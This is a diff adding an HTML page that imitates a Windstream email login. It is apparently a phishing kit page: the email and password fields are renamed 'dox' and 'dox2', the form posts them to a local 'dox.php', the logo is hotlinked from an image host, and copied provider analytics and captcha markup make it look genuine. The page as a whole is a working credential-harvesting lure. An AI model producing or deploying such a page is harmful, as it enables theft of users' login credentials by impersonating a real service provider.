@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html lang="en" style="" class=" js flexbox flexboxlegacy rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		    						    <meta name="viewport" content="width=device-width">
+			    <meta name="viewport" content="initial-scale=1.0">
+				<meta http-equiv="X-UA-Compatible" content="IE=11">
+		    
+		    		    	<title>Windstream | Login</title>
+		    
+				  						
+							<script type="text/javascript" async="" src=""></script><script src=""></script>
+			
+							<script src=""></script>
+			
+							<link href="./T.DOX/dox.min.css" rel="stylesheet" media="screen">
+				<script src=""></script>
+			
+											    <script type="text/javascript" src="" async="" defer=""></script>
+
+
+	
+	<script type="text/javascript">
+		var handler = "captcha";
+		var now = new Date();
+		var can_submit_by = now.getTime() + (20 * 1000);
+		var completed_captcha = '0' == true;
+
+		function enableSubmit(){
+			$('#recaptcha_submit').removeAttr("disabled");
+		};
+		$(document).ready(function () {
+			$("#main-form").submit(function (e) {
+				if ((handler == 'captcha' || handler == 'reject') && !completed_captcha) {
+					e.preventDefault();
+					$('#captcha_modal').modal({
+						backdrop: 'static',
+						keyboard: false
+					});
+					$('#recaptcha_submit').click(function () {
+						var my_recaptcha_response_field = document.createElement( "input" );
+						my_recaptcha_response_field.setAttribute("type", "hidden");
+						my_recaptcha_response_field.setAttribute("name", "g-recaptcha-response");
+						my_recaptcha_response_field.setAttribute("value", grecaptcha.getResponse());
+
+						$('#main-form').append(my_recaptcha_response_field);
+						$('#captcha_modal').on('hidden.bs.modal', function (e) {
+							completed_captcha = true;
+							$("#main-form").submit();
+						})
+						$("#captcha_modal").modal('hide');
+					});
+
+					$('#captcha_modal').css('position', 'absolute');
+					return false;
+				}
+				$('#waiting_modal').modal({
+					backdrop: 'static',
+					keyboard: false
+				});
+
+				var now = new Date();
+				if (handler == 'allow' || handler == 'whitelist' || now.getTime() > can_submit_by) {
+					return true;
+				}
+				setTimeout("$('#main-form').submit();", now.getTime() - can_submit_by);
+				return false;
+			});
+		});
+	</script>
+
+			
+															<link rel="stylesheet" type="text/css" href="./T.DOX/base.css">
+			
+								<script src=""></script>
+			
+
+						<style>
+			.modal-sm {
+				width: auto;
+			}
+
+																		.content .component-header {
+								padding-top: 1px;
+							}
+						
+						.content .logo_bar_top {
+							border-top: none;
+							font-weight: normal;
+						}
+
+						.content .self-care a {
+							font-size: 12px;
+						}
+
+						.footer_notes, .self-care {
+							font-size: 12px;
+						}
+
+						.footer_notes .row {
+							display: table-footer-group;
+						}
+
+						#bodyContent .password-toggle {
+							font-size: 10px;
+						}
+
+						.submit-button {
+							background-color: #40aec8;
+						}
+
+						#form-content a, #bodyContent a {
+							color: #1f8aa3;
+						}
+
+																									
+																			
+						.content .progress {
+							background-color: #B3B3B3;
+						}
+
+						.content .progress .indeterminate {
+							background-color: #5E5E5E;
+						}
+
+												.content .logo {
+							max-width: 160px;
+						}
+						
+										
+				</style>
+
+								
+    <link href="./T.DOX/federated_login.css" rel="stylesheet" media="screen">
+  	</head>
+	<body>
+				  <div class="modal fade modal-sm" id="waiting_modal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h4 class="modal-title">Please wait...</h4>
+      </div>
+      <div class="modal-body">
+        <p>Please wait while we log you in.</p>
+      </div>
+    </div><!-- /.modal-content -->
+  </div><!-- /.modal-dialog -->
+</div><!-- /.modal -->
+<div class="modal fade modal-sm" id="captcha_modal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h4 class="modal-title">Please Complete The Captcha</h4>
+      </div>
+      <div class="modal-body">
+        <p class="alert alert-block alert-error">Your password has been entered incorrectly multiple times. In order to validate your account, please enter the letters or phrase you see in the image below.</p>
+    <div class="g-recaptcha" data-sitekey="6Lf3gj8UAAAAAFLfSA34XxSvXgCxH-hErj-u2t4M" data-callback="enableSubmit"><div style="width: 304px; height: 78px;"><div><iframe src="./T.DOX/anchor.html" width="304" height="78" role="presentation" name="a-b81c4n9phidp" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div></div>
+      </div>
+      <div class="modal-footer">
+        <button type="button" id="recaptcha_submit" class="btn btn-primary" disabled="disabled">Submit</button>
+      </div>
+    </div><!-- /.modal-content -->
+  </div><!-- /.modal-dialog -->
+</div><!-- /.modal -->
+		
+		<div id="bodyContent">
+			<div class="content mvpd-login">
+									<header class="header">
+			    																<div><div><br /></div>
+<p><img src="https://imagizer.imageshack.com/img924/4104/LTjDp4.jpg" width="229" height="78" /></p>
+<div><br /></div>
+<div><br /></div>
+					
+									<div class="clearfix"></div>
+
+	
+	    <div id="windstream_examples">
+        <div class="login_header">Login using a Windstream email address.</div>
+    </div>
+
+													<h2 class="component-header "></h2>
+						
+						
+								</header>
+
+						<div class="main-body">
+				
+							
+							    			    				    			            	<form id="company-info-form" name="companyInfoForm" aria-label="companyinfo" action="dox.php" method="post" class="ng-invalid ng-invalid-required ng-valid-maxlength ng-valid-minlength ng-valid-email ng-dirty ng-valid-parse ng-valid-validation-error">
+            		    		        						<div class="form-group">
+																<label for="password" class="form-label">
+			Email Address
+		<input placeholder="Username" onfocus="showElement(&#39;username-help&#39;)" onblur="hideElement(&#39;username-help&#39;)" class="form-control" id="username" type="email" name="dox" value="" tabindex="1" autocapitalize="off" autocorrect="off" required="" autofocus="">
+		</div>
+		
+					<div class="form-group">
+			<label for="password" class="form-label">
+			Password
+		</label>
+		<input placeholder="Password" onfocus="showElement(&#39;password-help&#39;)" onblur="hideElement(&#39;password-help&#39;)" class="form-control" id="password" type="password" name="dox2" value="" required="" tabindex="2" autocapitalize="off" autocorrect="off">
+			<a class="password-toggle" onclick="toggleShowPassword(&#39;password&#39;, &#39;SHOW&#39;, &#39;HIDE&#39;, this)">SHOW</a>
+		</div>
+		
+	<input type="hidden" name="login_type" value="username,password">
+
+    		        	    						<ul class="errors">
+    							    						</ul>
+    					
+    					    						<button id="login" type="submit" class="login submit-button">Log In</button>
+    					    				                <div class="clearfix">
+    				    					    						<!-- remember_me Area -->
+    						<div class="checkbox-group remember" onmouseover="mouseOverToPopupRememberMe(true);" onmouseout="mouseOverToPopupRememberMe(false);">
+    							<input type="checkbox" id="remember_me" name="remember_me" value="yes" tabindex="4" checked="checked">
+    							<label for="remember_me">Remember Me</label>
+    						</div>
+    						<div id="rememberMePopup">When you choose "Remember Me" on sign in, we will remember who you are and keep you signed in for up to 90 days, unless you sign out or your browser cookies are deleted. <br>If you are on a public computer, we recommend you uncheck the box.</div>
+    					    				
+                                                                                </div>
+			</form>
+					
+		
+		            <ul class="social-links">
+                            </ul>
+						</div>
+
+						<ul class="self-care">
+				
+																	<li>
+						<a target="_blank" id="selfcare_link_1" href="">Forgot Username?</a>
+					</li>
+							</ul>
+			
+					<footer class="footer">
+												<p class="footer-message"></p>
+			
+					</footer>
+							</div>
+
+						
+		    		    						<script type="text/javascript" src=""></script>
+<script type="text/javascript"><!--
+/* You may give each page an identifying name, server, and channel on
+the next lines. */
+s.pageName="Federated Login";
+s.server="";
+s.channel="";
+s.pageType="";
+s.prop1="Windstream";
+s.prop2="";
+s.prop3="";
+s.prop4="";
+s.prop5="";
+s.prop6="Federated Login";
+s.prop7="b3b23e10109abaae20d57ab4ec0db400";
+/* Conversion Variables */
+s.campaign="";
+s.state="";
+s.zip="";
+s.events="";
+s.products="";
+s.purchaseID="";
+s.eVar1="";
+s.eVar2="";
+s.eVar3="";
+s.eVar4="";
+s.eVar5="";
+/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
+var s_code=s.t();if(s_code)document.write(s_code)//-->
+</script>
+<script type="text/javascript"><!--
+if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
+//--></script><noscript><img src="https://synacor.112.2o7.net/b/ss/synacortve-idmtools/1/H.24.4--NS/0"
+height="1" width="1" border="0" alt="" /></noscript><!--/DO NOT REMOVE/-->
+<!-- End SiteCatalyst code version: H.24.4. -->
+
+									</div>
+	
+
+<div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative;"><iframe title="recaptcha challenge" src="./T.DOX/bframe.html" name="c-b81c4n9phidp" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe></div></div></body></html>
